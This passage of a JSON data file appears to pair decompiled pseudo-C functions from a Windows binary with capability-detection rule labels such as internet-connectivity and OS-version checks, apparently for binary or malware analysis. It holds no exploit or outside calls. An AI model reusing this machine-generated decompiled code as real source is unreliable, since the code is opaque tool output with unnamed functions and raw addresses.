2;\n            var_8h = var_1ch;\n            var_4h = fcn.000352f0(var_1ch, 4);\n            if (var_4h == 0) {\n                var_24h = 0x21590004;\n            }\n            else {\n                for (var_18h = 0; var_18h < var_8h; var_18h = var_18h + 1) {\n                    uVar1 = fcn.000352f0(var_10h, 0x10);\n                    *(var_4h + var_18h * 4) = uVar1;\n                    if (*(var_4h + var_18h * 4) == 0) {\n                        var_24h = 0x21590004;\n                        goto code_r0x00029fc4;\n                    }\n                    *(*(var_4h + var_18h * 4) + 4) = *(var_4h + var_18h * 4) + 8;\n                    **(var_4h + var_18h * 4) = 4;\n                    **(*(var_4h + var_18h * 4) + 4) = *(var_20h + 0x20 + var_18h * 0x40);\n                    *(*(var_4h + var_18h * 4) + 0x14) = *(var_4h + var_18h * 4) + 0x18;\n                    *(*(var_4h + var_18h * 4) + 0x10) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x14) = *(var_20h + 0x10 + var_18h * 0x40);\n                    *(*(var_4h + var_18h * 4) + 0x24) = *(var_4h + var_18h * 4) + 0x28;\n                    *(*(var_4h + var_18h * 4) + 0x20) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x24) = *(var_20h + 0x18 + var_18h * 0x40);\n                    *(*(var_4h + var_18h * 4) + 0x34) = *(var_4h + var_18h * 4) + 0x38;\n                    *(*(var_4h + var_18h * 4) + 0x30) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x34) = *(var_20h + 0x14 + var_18h * 0x40);\n                    if ((*(var_20h + 0xc + var_18h * 0x40) & 0x80000000) == 0) {\n                        *(*(var_4h + var_18h * 4) + 0x44) = *(var_4h + var_18h * 4) + 0x48;\n                        *(*(var_4h + var_18h * 4) + 0x40) = 4;\n                        **(*(var_4h + var_18h * 4) + 0x44) = *(var_20h + 0xc + var_18h * 0x40);\n                    }\n                    else {\n                        *(*(var_4h + var_18h * 4) + 0x44) = *(var_4h + var_18h * 4) + 0x48;\n                        *(*(var_4h + var_18h * 4) + 0x40) = 4;\n                        **(*(var_4h + var_18h * 4) + 0x44) = 0;\n                    }\n                    *(*(var_4h + var_18h * 4) + 0x54) = *(var_4h + var_18h * 4) + 0x58;\n                    *(*(var_4h + var_18h * 4) + 0x50) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x54) = *(var_20h + 0x1c + var_18h * 0x40);\n                    if ((*(var_20h + 0xc + var_18h * 0x40) & 0x80000000) == 0) {\n                        *(*(var_4h + var_18h * 4) + 100) = *(var_4h + var_18h * 4) + 0x68;\n                        *(*(var_4h + var_18h * 4) + 0x60) = 4;\n                        **(*(var_4h + var_18h * 4) + 100) = 0;\n                    }\n                    else {\n                        *(*(var_4h + var_18h * 4) + 100) = *(var_4h + var_18h * 4) + 0x68;\n                        *(*(var_4h + var_18h * 4) + 0x60) = 4;\n                        **(*(var_4h + var_18h * 4) + 100) = *(var_20h + 0xc + var_18h * 0x40) & 0x7fffffff;\n                    }\n                }\n                var_24h = fcn.0002ee00(&var_10h, arg_18h, arg_1ch);\n            }\n        }\ncode_r0x00029fc4:\n        if (var_4h != 0) {\n            for (var_18h = 0; var_18h < var_8h; var_18h = var_18h + 1) {\n                fcn.00035330(*(var_4h + var_18h * 4));\n            }\n        }\n        fcn.00035330(var_ch);\n        fcn.00035330(var_4h);\n        fcn.00035330(var_20h);\n    }\n    else {\n        var_24h = var_14h + 0x191U | 0x21590000;\n    }\n    return var_24h;\n}\n",
        "token_count": 1852
    },
    "0002a070": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002a070(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint var_1a0h;\n    int32_t var_19ch;\n    int32_t var_198h;\n    int32_t *var_194h;\n    int32_t *var_190h;\n    uint32_t var_18ch;\n    uint var_188h;\n    uint var_180h;\n    int32_t *var_17ch;\n    uint var_178h;\n    uint var_170h;\n    int32_t *var_16ch;\n    uint var_168h;\n    uint var_164h;\n    int32_t var_158h;\n    int32_t var_154h;\n    uint32_t var_124h;\n    uint var_120h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0x100;\n    var_18h = fcn.000290b0(7, arg_8h, &var_120h, 0x100, &var_1ch, 0);\n    var_14h = 0;\n    var_ch = 0;\n    var_8h = 0;\n    var_10h = 1;\n    var_16ch = arg_ch;\n    do {\n        uVar1 = *var_16ch;\n        var_16ch = var_16ch + 1;\n    } while (uVar1 != 0);\n    iVar2 = fcn.000292c0(7, arg_8h, arg_ch, var_16ch + (1 - (arg_ch + 1)), &var_14h, 1);\n    if (iVar2 != 0) {\n        return;\n    }\n    iVar2 = fcn.000235a0(0xfffffffe, 7, &arg_8h, &var_168h);\n    if (iVar2 != 0) {\n        return;\n    }\n    fcn.000237c0(0xfffffffe, 7, var_164h, 0, var_158h + 1);\n    if (var_18h != 0) {\n        return;\n    }\n    var_4h = fcn.00078658(&var_120h, 0x3a);\n    if (var_4h == 0) {\n        return;\n    }\n    var_124h = var_4h - &var_120h;\n    var_17ch = arg_ch;\n    do {\n        uVar1 = *var_17ch;\n        var_17ch = var_17ch + 1;\n    } while (uVar1 != 0);\n    if (((var_17ch - (arg_ch + 1) <= var_124h) || (*(arg_ch + var_124h) != 0x3a)) || (var_124h == 0))\n    goto code_r0x0002a3a6;\n    var_190h = &var_120h;\n    var_194h = arg_ch;\n    for (var_18ch = var_124h - 1; 3 < var_18ch; var_18ch = var_18ch - 4) {\n        if (*var_194h != *var_190h) goto code_r0x0002a274;\n        var_190h = var_190h + 1;\n        var_194h = var_194h + 1;\n    }\n    if (var_18ch == 0) {\ncode_r0x0002a34a:\n        var_19ch = 0;\n    }\n    else {\ncode_r0x0002a274:\n        var_198h = *var_194h - *var_190h;\n        if (var_198h == 0) {\n            if (var_18ch == 1) goto code_r0x0002a34a;\n            var_198h = *(var_194h + 1) - *(var_190h + 1);\n            if (var_198h == 0) {\n                if (var_18ch == 2) goto code_r0x0002a34a;\n                var_198h = *(var_194h + 2) - *(var_190h + 2);\n                if (var_198h == 0) {\n                    if ((var_18ch == 3) || (var_198h = *(var_194h + 3) - *(var_190h + 3),  var_198h == 0))\n                    goto code_r0x0002a34a;\n                }\n            }\n        }\n        var_19ch = 1;\n        if (var_198h < 1) {\n            var_19ch = -1;\n        }\n    }\n    if (var_19ch == 0) {\n        fcn.000237c0(0xfffffffe, 7, var_164h, 1, var_154h + 1);\n        return;\n    }\ncode_r0x0002a3a6:\n    fcn.000237c0(0xfffffffe, 7, var_164h, 1, 1);\n    return;\n}\n",
        "token_count": 1196
    },
    "0002a400": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_158h\n\nuint32_t __cdecl fcn.0002a400(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint var_158h;\n    uint var_150h;\n    uint *var_14ch;\n    uint var_144h;\n    char *var_140h;\n    uint *var_13ch;\n    uint var_138h;\n    uint var_130h;\n    uint *var_12ch;\n    uint var_128h;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0;\n    *arg_14h = 3;\n    var_14h = fcn.00023560(0xfffffffe, 7, &var_20h, &var_24h);\n    if (var_14h == 0) {\n        var_ch = NULL;\n        var_4h = 0;\n        var_10h = 6;\n        var_8h = var_20h;\n        var_ch = fcn.000352f0(6, 8);\n        if (var_ch == NULL) {\n            var_28h = 0x21590004;\n        }\n        else {\n            *var_ch = 5;\n            var_ch[1] = 2;\n            var_ch[2] = 0x1c;\n            var_ch[3] = 200;\n            var_ch[4] = 0x1d;\n            var_ch[5] = 2;\n            var_ch[6] = 0x1e;\n            var_ch[7] = 2;\n            var_ch[8] = 1;\n            var_ch[9] = 8;\n            var_ch[10] = 0x5f;\n            var_ch[0xb] = 2;\n            var_4h = fcn.000352f0(var_8h, 4);\n            if (var_4h == 0) {\n                var_28h = 0x21590004;\n            }\n            else {\n                for (var_18h = 0; var_18h < var_20h; var_18h = var_18h + 1) {\n                    var_14h = fcn.000290b0(7, *(var_24h + 4 + var_18h * 0x40), &var_128h, 0x100, &var_1ch, 1);\n                    if (var_14h != 0) {\n                        var_128h._0_1_ = 0;\n                    }\n                    var_12ch = &var_128h;\n                    do {\n                        cVar1 = *var_12ch;\n                        var_12ch = var_12ch + 1;\n                    } while (cVar1 != '\\0');\n                    uVar2 = fcn.00035200(var_12ch + ((var_10h * 0x10 + 1) - (&var_128h + 1)));\n                    *(var_4h + var_18h * 4) = uVar2;\n                    if (*(var_4h + var_18h * 4) == 0) {\n                        var_28h = 0x21590004;\n                        goto code_r0x0002a878;\n                    }\n                    fcn.00078790(*(var_4h + var_18h * 4), 0, var_10h << 4);\n                    *(*(var_4h + var_18h * 4) + 4) = *(var_4h + var_18h * 4) + 8;\n                    **(var_4h + var_18h * 4) = 4;\n                    **(*(var_4h + var_18h * 4) + 4) = *(var_24h + 0xc + var_18h * 0x40);\n                    var_13ch = &var_128h;\n                    var_140h = var_10h * 0x10 + *(var_4h + var_18h * 4);\n                    do {\n                        cVar1 = *var_13ch;\n                        *var_140h = cVar1;\n                        var_13ch = var_13ch + 1;\n                        var_140h = var_140h + 1;\n                    } while (cVar1 != '\\0');\n                    *(*(var_4h + var_18h * 4) + 0x14) = var_10h * 0x10 + *(var_4h + var_18h * 4);\n                    var_14ch = &var_128h;\n                    do {\n                        cVar1 = *var_14ch;\n                        var_14ch = var_14ch + 1;\n                    } while (cVar1 != '\\0');\n                    *(*(var_4h + var_18h * 4) + 0x10) = var_14ch + (1 - (&var_128h + 1));\n                    *(*(var_4h + var_18h * 4) + 0x24) = *(var_4h + var_18h * 4) + 0x28;\n                    *(*(var_4h + var_18h * 4) + 0x20) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x24) = *(var_24h + 0x10 + var_18h * 0x40);\n                    *(*(var_4h + var_18h * 4) + 0x34) = *(var_4h + var_18h * 4) + 0x38;\n                    *(*(var_4h + var_18h * 4) + 0x30) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x34) = *(var_24h + 0x14 + var_18h * 0x40);\n                    *(*(var_4h + var_18h * 4) + 0x44) = *(var_4h + var_18h * 4) + 0x48;\n                    *(*(var_4h + var_18h * 4) + 0x40) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x44) = *(var_24h + 0x28 + var_18h * 0x40);\n                    *(*(var_4h + var_18h * 4) + 0x54) = *(var_4h + var_18h * 4) + 0x58;\n                    *(*(var_4h + var_18h * 4) + 0x50) = 4;\n                    **(*(var_4h + var_18h * 4) + 0x54) = *(var_24h + 0x18 + var_18h * 0x40);\n                }\n                var_28h = fcn.0002ee00(&var_10h, arg_18h, arg_1ch);\n            }\n        }\ncode_r0x0002a878:\n        if (var_4h != 0) {\n            for (var_18h = 0; var_18h < var_8h; var_18h = var_18h + 1) {\n                fcn.00035330(*(var_4h + var_18h * 4));\n            }\n            fcn.00035330(var_4h);\n        }\n        fcn.00035330(var_ch);\n        fcn.00023800(var_24h);\n    }\n    else {\n        var_28h = var_14h + 0x191U | 0x21590000;\n    }\n    return var_28h;\n}\n",
        "token_count": 1856
    },
    "0002a8e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0002a8e0(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 0;\n    var_4h = fcn.00023560(0xfffffffe, 7, &var_8h, &var_ch);\n    if (var_4h == 0) {\n        fcn.00023720(var_ch, var_8h);\n        fcn.00023800(var_ch);\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = var_4h + 0x191U | 0x21590000;\n    }\n    return uVar1;\n}\n",
        "token_count": 193
    },
    "0002a940": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0002a940(void)\n\n{\n    int32_t iVar1;\n    uint var_114h;\n    int32_t var_110h;\n    uint var_10ch;\n    uint var_108h;\n    \n    fcn.00036a10(0xb1c59f10);\n    *0xb1c59f24 = fcn.00066c80();\n    *0xb1c59f20 = 0xb1c68780;\n    *0xb1c59de4 = 0xb1c68780;\n    fcn.00052650(*0xb1c68784, 0xb1c68894);\n    fcn.00036a10(0xb1c685e0);\n    fcn.0002b0f0(0, 0, 0, 0, 0, 0, 0);\n    for (var_110h = 500; var_110h < 0x227; var_110h = var_110h + 1) {\n        iVar1 = fcn.00029090(var_110h, &var_108h, 0x104, &var_10ch);\n        if ((iVar1 == 0) && (var_108h != '\\0')) {\n            fcn.000292a0(var_110h, 0xb1be15f4, 8);\n            iVar1 = fcn.0002ab80(&var_108h, 0);\n            fcn.000209a0(2000);\n            fcn.000292a0(var_110h, &var_108h, var_10ch);\n            if ((iVar1 != 0) && (iVar1 != 0x21590206)) {\n                fcn.00029970(0xd, iVar1, 0, 0, 0xbb9aca00);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 429
    },
    "0002aa80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0002aa80(void)\n\n{\n    uint *puVar1;\n    uint var_8h;\n    uint *var_4h;\n    \n    fcn.00036c40(0xb1c59f10);\n    var_4h = **0xb1c59f20;\n    while (var_4h != NULL) {\n        puVar1 = *var_4h;\n        if (var_4h[0x44] != 0) {\n            (*var_4h[0x44])();\n        }\n        fcn.0002b230(var_4h);\n        fcn.00035330(var_4h);\n        var_4h = puVar1;\n    }\n    **0xb1c59f20 = 0;\n    *0xb1c59f20 = NULL;\n    *0xb1c59de4 = 0;\n    fcn.00052650(*0xb1c68784, 0xb1c68894);\n    fcn.00036cd0(0xb1c59f10);\n    fcn.00036a80(0xb1c59f10);\n    if (*0xb1c59dec != 0) {\n        fcn.00036c40(0xb1c685e0);\n        fcn.0002b230(0xb1c59de8);\n        *0xb1c59dec = 0;\n        *0xb1c5b36c = 0;\n        *0xb1c5b370 = 0;\n        fcn.00036cd0(0xb1c685e0);\n    }\n    fcn.00036a80(0xb1c685e0);\n    return;\n}\n",
        "token_count": 379
    },
    "0002ab80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0002ab80(char *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint var_14h;\n    int32_t var_10h;\n    code *var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_8h = 0xffffffff;\n    fcn.00036ab0(0xb1c59f10);\n    for (var_4h = *0xb1c59f20; var_4h != NULL; var_4h = *var_4h) {\n        fcn.00052650();\n    }\n    fcn.00036b60(0xb1c59f10);\n    fcn.00052650(*0xb1c5b364, 0xb1c5b368);\n    arg_8h_00 = fcn.00035200(0x128);\n    if (arg_8h_00 == NULL) {\n        var_10h = fcn.00035620();\n    }\n    else {\n        fcn.00078790(arg_8h_00, 0, 0x128);\n        if (arg_ch == 0) {\n            if (*arg_8h == '&') {\n                var_10h = fcn.0002b3f0(arg_8h, arg_8h_00);\n            }\n            else {\n                var_10h = fcn.0002b2e0(arg_8h_00, arg_8h);\n            }\n        }\n        else {\n            var_10h = fcn.0002b290(arg_8h_00, arg_ch, arg_8h, arg_8h);\n        }\n        if (var_10h == 0) {\n            fcn.00078652(arg_8h_00 + 2, arg_8h, 0x104);\n            *(arg_8h_00 + 0x10b) = 0;\n            fcn.00036ab0(0xb1c59f10);\n            var_4h = *0xb1c59f20;\n            while (((var_4h != NULL && (var_4h[1] != arg_8h_00[1])) &&\n                   (iVar1 = fcn.0007861c(var_4h + 2, arg_8h_00 + 2),  iVar1 != 0))) {\n                var_4h = *var_4h;\n            }\n            fcn.00036b60(0xb1c59f10);\n            if (var_4h == NULL) {\n                var_10h = fcn.0002b520(arg_8h_00, 0xb1bde69c, &var_ch);\n                if (var_10h == 0) {\n                    fcn.0002b520(arg_8h_00, 0xb1be15fc, arg_8h_00 + 0x43);\n                    fcn.0002b520(arg_8h_00, 0xb1bde6a8, arg_8h_00 + 0x44);\n                    var_10h = (*var_ch)(*0xb1c59f20);\n                    if (var_10h == 0) {\n                        fcn.00036c40(0xb1c59f10);\n                        **0xb1c59de4 = arg_8h_00;\n                        *0xb1c59de4 = arg_8h_00;\n                        fcn.00036cd0(0xb1c59f10);\n                        var_10h = 0;\n                    }\n                }\n            }\n            else {\n                var_10h = 0x215901fc;\n            }\n        }\n    }\n    if (var_10h != 0) {\n        fcn.0002b230(arg_8h_00);\n        fcn.00035330(arg_8h_00);\n    }\n    fcn.00036ab0(0xb1c59f10);\n    for (var_4h = *0xb1c59f20; var_4h != NULL; var_4h = *var_4h) {\n        fcn.00052650();\n    }\n    fcn.00036b60(0xb1c59f10);\n    return var_10h;\n}\n",
        "token_count": 975
    },
    "0002ae00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0002ae00(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    code *var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_ch = NULL;\n    fcn.00036c40(0xb1c59f10);\n    var_4h = *0xb1c59f20;\n    var_8h = **0xb1c59f20;\n    do {\n        if (var_8h == NULL) {\ncode_r0x0002ae67:\n            if (var_8h == NULL) {\n                fcn.00036cd0(0xb1c59f10);\n                var_10h = 0x215901fd;\n            }\n            else {\n                *var_4h = *var_8h;\n                if (var_8h == *0xb1c59de4) {\n                    *0xb1c59de4 = var_4h;\n                }\n                fcn.00036cd0(0xb1c59f10);\n                if (var_ch == NULL) {\n                    var_10h = 0x215901fe;\n                }\n                else {\n                    (*var_ch)();\n                    var_10h = 0;\n                }\n                fcn.0002b230(var_8h);\n                fcn.00035330(var_8h);\n            }\n            return var_10h;\n        }\n        iVar1 = fcn.0007861c(var_8h + 2, arg_8h);\n        if (iVar1 == 0) {\n            var_ch = var_8h[0x44];\n            goto code_r0x0002ae67;\n        }\n        var_4h = var_8h;\n        var_8h = *var_8h;\n    } while( true );\n}\n",
        "token_count": 411
    },
    "0002afa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl\nfcn.0002afa0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_8h = (*(*0xb1c59f20)[0x43])(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, 0x21590001);\n    if (var_8h == 0x21590001) {\n        fcn.00036ab0(0xb1c59f10);\n        var_4h = **0xb1c59f20;\n        while ((var_4h != NULL &&\n               ((var_4h[0x43] == 0 ||\n                (var_8h = (*var_4h[0x43])(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h), \n                var_8h == 0x21590001))))) {\n            var_4h = *var_4h;\n        }\n        fcn.00036b60(0xb1c59f10);\n    }\n    return var_8h;\n}\n",
        "token_count": 328
    },
    "0002b0f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0002b0f0(void)\n\n{\n    int32_t iVar1;\n    uint var_118h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    iVar1 = fcn.00029090(0x22a, &var_118h, 0x104, &var_4h);\n    if (iVar1 == 0) {\n        fcn.00036c40(0xb1c685e0);\n        var_8h = 1;\n        if (*0xb1c59dec != 0) {\n            fcn.0002b230(0xb1c59de8);\n            *0xb1c5b36c = 0;\n            *0xb1c5b370 = 0;\n        }\n        if (var_118h == '&') {\n            var_ch = fcn.0002b3f0(&var_118h, 0xb1c59de8);\n        }\n        else {\n            var_ch = fcn.0002b2e0(0xb1c59de8, &var_118h);\n        }\n        if (((var_ch == 0) && (var_ch = fcn.0002b520(0xb1c59de8, 0xb1be160c, 0xb1c5b36c),  var_ch == 0)) &&\n           (var_ch = fcn.0002b520(0xb1c59de8, 0xb1be1618, 0xb1c5b370),  var_ch == 0)) {\n            var_ch = 0;\n        }\n    }\n    else {\n        var_ch = 0x21590065;\n    }\n    if (var_ch != 0) {\n        *0xb1c5b36c = 0;\n        *0xb1c5b370 = 0;\n        fcn.0002b230(0xb1c59de8);\n    }\n    if (var_8h != 0) {\n        fcn.00036cd0(0xb1c685e0);\n    }\n    return var_ch;\n}\n",
        "token_count": 498
    },
    "0002b230": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002b230(int32_t arg_8h)\n\n{\n    fcn.00052650(*(arg_8h + 4), arg_8h + 0x114);\n    if (((arg_8h != 0) && (*(arg_8h + 4) != 0)) && (*(arg_8h + 0x118) != 0)) {\n        fcn.0005d930(*(arg_8h + 0x11c), *(arg_8h + 4), 1);\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "0002b3f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0002b3f0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_10h;\n    uint uVar1;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = fcn.00035eb0(arg_8h + 1, 0, 0);\n    var_4h = fcn.000290b0(3, var_8h, 0, 0, &var_54h, 0);\n    if (var_4h == 0) {\n        arg_10h = fcn.00035200(var_54h);\n        if (arg_10h == 0) {\n            var_5ch = 0x21590004;\n        }\n        else {\n            var_4h = fcn.000290b0(3, var_8h, arg_10h, var_54h, &var_54h, 0);\n            if (var_4h == 0) {\n                var_50h._0_2_ = 0x26;\n                fcn.00078664(var_8h, &var_50h + 2, 10);\n                *(arg_ch + 0x118) = 1;\n                uVar1 = fcn.00066c80(arg_10h, &var_50h, &var_50h, arg_ch + 4);\n                var_5ch = fcn.0005ccf0(uVar1);\n            }\n            else {\n                var_5ch = var_4h + 0x191U | 0x21590000;\n            }\n            fcn.00035330(arg_10h);\n            uVar1 = fcn.00066c80();\n            *(arg_ch + 0x11c) = uVar1;\n            if (var_5ch != 0) {\n                *(arg_ch + 4) = 0;\n            }\n        }\n    }\n    else {\n        var_5ch = var_4h + 0x191U | 0x21590000;\n    }\n    return var_5ch;\n}\n",
        "token_count": 522
    },
    "0002c070": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0002c070(uint arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, char *arg_18h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_178h;\n    uint var_170h;\n    char *var_16ch;\n    uint var_168h;\n    uint32_t var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00034550(0xb1c59f2c);\n    iVar2 = fcn.000235a0(0xfffffffe, 8, &arg_8h, &var_58h);\n    if (iVar2 == 0) {\n        if (((arg_10h == 1) && (var_44h == 1)) &&\n           ((var_48h == arg_ch || (((var_48h == 0 || (var_3ch == arg_ch)) || (var_3ch == 0)))))) {\n            var_4h = fcn.000290b0(var_50h, var_54h, arg_18h, 0x104, &var_5ch, 1);\n            if (var_4h == 0) {\n                var_40h = var_40h + 1;\n                var_4h = fcn.000237c0(var_58h, var_50h, var_54h, 2, var_40h);\n                if ((var_4h == 0) && (arg_ch != 0)) {\n                    if (var_48h == 0) {\n                        var_48h = arg_ch;\n                        var_4h = fcn.000237c0(var_58h, var_50h, var_54h, 0, arg_ch);\n                    }\n                    else if (var_3ch == 0) {\n                        var_3ch = arg_ch;\n                        var_4h = fcn.000237c0(var_58h, var_50h, var_54h, 3, arg_ch);\n                    }\n                }\n            }\n            if (var_4h == 0) {\n                var_60h = 0;\n            }\n            else {\n                var_60h = var_4h + 0x191U | 0x21590000;\n            }\n        }\n        else {\n            var_60h = 0x21590064;\n        }\n    }\n    else {\n        if (*0xb1c5957c == 0) {\n            iVar2 = fcn.000366e0(0x104, &var_168h);\n            if (iVar2 == 0) {\n                var_60h = fcn.00035620();\n                goto code_r0x0002c355;\n            }\n        }\n        else if (arg_10h == 1) {\n            fcn.0002bc70(&var_168h, 0x104);\n        }\n        else {\n            fcn.0002bc40(&var_168h, 0x104);\n        }\n        if (arg_14h == 0) {\n            iVar2 = fcn.000365a0(&var_168h, 0xb1be16b4, 0, arg_18h);\n            if (iVar2 == 0) {\n                var_60h = fcn.00035620();\n                goto code_r0x0002c355;\n            }\n        }\n        else {\n            fcn.00020a20(arg_18h, 0x104, 0xb1be16b8, &var_168h);\n        }\n        var_8h = 0;\n        var_14h = arg_ch;\n        var_10h = arg_10h;\n        var_ch = 1;\n        var_16ch = arg_18h;\n        do {\n            cVar1 = *var_16ch;\n            var_16ch = var_16ch + 1;\n        } while (cVar1 != '\\0');\n        var_4h = fcn.000292c0(8, arg_8h, arg_18h, var_16ch + (1 - (arg_18h + 1)), &var_14h, 1);\n        if (var_4h == 0) {\n            if ((arg_10h & 1) == 0) {\n                var_60h = 0;\n            }\n            else {\n                var_60h = fcn.0002c610(arg_8h, arg_18h);\n                if (var_60h != 0) {\n                    iVar2 = fcn.000235a0(0xfffffffe, 8, &arg_8h, &var_58h);\n                    if (iVar2 == 0) {\n                        fcn.000236f0(var_58h, var_50h, var_54h);\n                    }\n                    fcn.00035e00(arg_18h);\n                }\n            }\n        }\n        else {\n            var_60h = var_4h + 0x191U | 0x21590000;\n            fcn.00035e00(arg_18h);\n        }\n    }\ncode_r0x0002c355:\n    fcn.000345c0(0xb1c59f2c);\n    return var_60h;\n}\n",
        "token_count": 1278
    },
    "0002c370": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
